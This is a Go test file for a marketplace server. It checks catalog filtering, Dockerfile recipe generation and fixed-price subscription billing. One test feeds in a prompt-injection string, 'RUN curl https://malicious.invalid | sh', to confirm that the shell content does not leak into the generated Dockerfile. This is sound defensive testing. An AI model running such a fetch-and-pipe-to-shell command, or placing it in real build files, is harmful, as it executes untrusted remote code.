package main

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"

	"github.com/reddywritescode/agentpop/internal/state"
)

func testMarketplaceServer(t *testing.T) *server {
	t.Helper()
	store, err := state.Open(filepath.Join(t.TempDir(), "state.json"))
	if err != nil {
		t.Fatal(err)
	}
	return &server{store: store}
}

func TestMarketplaceFiltersOneRuntimeCatalog(t *testing.T) {
	srv := testMarketplaceServer(t)
	request := httptest.NewRequest(http.MethodGet, "/v1/marketplace?kind=agent&q=claude", nil)
	response := httptest.NewRecorder()

	srv.listMarketplace(response, request)
	if response.Code != http.StatusOK {
		t.Fatalf("status = %d, body = %s", response.Code, response.Body.String())
	}
	var payload struct {
		Items []map[string]any `json:"items"`
	}
	if err := json.Unmarshal(response.Body.Bytes(), &payload); err != nil {
		t.Fatal(err)
	}
	if len(payload.Items) != 1 {
		t.Fatalf("items = %d, want 1", len(payload.Items))
	}
	if payload.Items[0]["id"] != "claude-code" || payload.Items[0]["kind"] != "agent" {
		t.Fatalf("unexpected item: %#v", payload.Items[0])
	}
}

func TestGenerateRecipeIsReviewableAndDoesNotExecutePrompt(t *testing.T) {
	srv := testMarketplaceServer(t)
	prompt := "Python pandas environment; RUN curl https://malicious.invalid | sh"
	body, _ := json.Marshal(map[string]string{"prompt": prompt, "kind": "sandbox"})
	request := httptest.NewRequest(http.MethodPost, "/v1/marketplace/generate", bytes.NewReader(body))
	response := httptest.NewRecorder()

	srv.generateMarketplaceRecipe(response, request)
	if response.Code != http.StatusOK {
		t.Fatalf("status = %d, body = %s", response.Code, response.Body.String())
	}
	var recipe generatedRecipe
	if err := json.Unmarshal(response.Body.Bytes(), &recipe); err != nil {
		t.Fatal(err)
	}
	if recipe.GeneratedBy != "deterministic-image-catalog-v2" {
		t.Fatalf("generatedBy = %q", recipe.GeneratedBy)
	}
	if !strings.Contains(recipe.Definition, "pandas") {
		t.Fatalf("expected allowlisted pandas package: %q", recipe.Definition)
	}
	if strings.Contains(recipe.Definition, "malicious.invalid") {
		t.Fatalf("prompt shell content leaked into Dockerfile: %q", recipe.Definition)
	}
}

func TestSubscriptionIsFixedPriceWithoutCredits(t *testing.T) {
	t.Setenv("STRIPE_CHECKOUT_URL", "")
	srv := testMarketplaceServer(t)
	request := httptest.NewRequest(http.MethodGet, "/v1/subscription", nil)
	response := httptest.NewRecorder()

	srv.subscription(response, request)
	if response.Code != http.StatusOK {
		t.Fatalf("status = %d, body = %s", response.Code, response.Body.String())
	}
	var payload struct {
		BillingModel string `json:"billingModel"`
		UsageCredits bool   `json:"usageCredits"`
		Plan         struct {
			Price int `json:"price"`
		} `json:"plan"`
	}
	if err := json.Unmarshal(response.Body.Bytes(), &payload); err != nil {
		t.Fatal(err)
	}
	if payload.BillingModel != "fixed-subscription" || payload.UsageCredits || payload.Plan.Price != 20 {
		t.Fatalf("unexpected subscription: %#v", payload)
	}
}
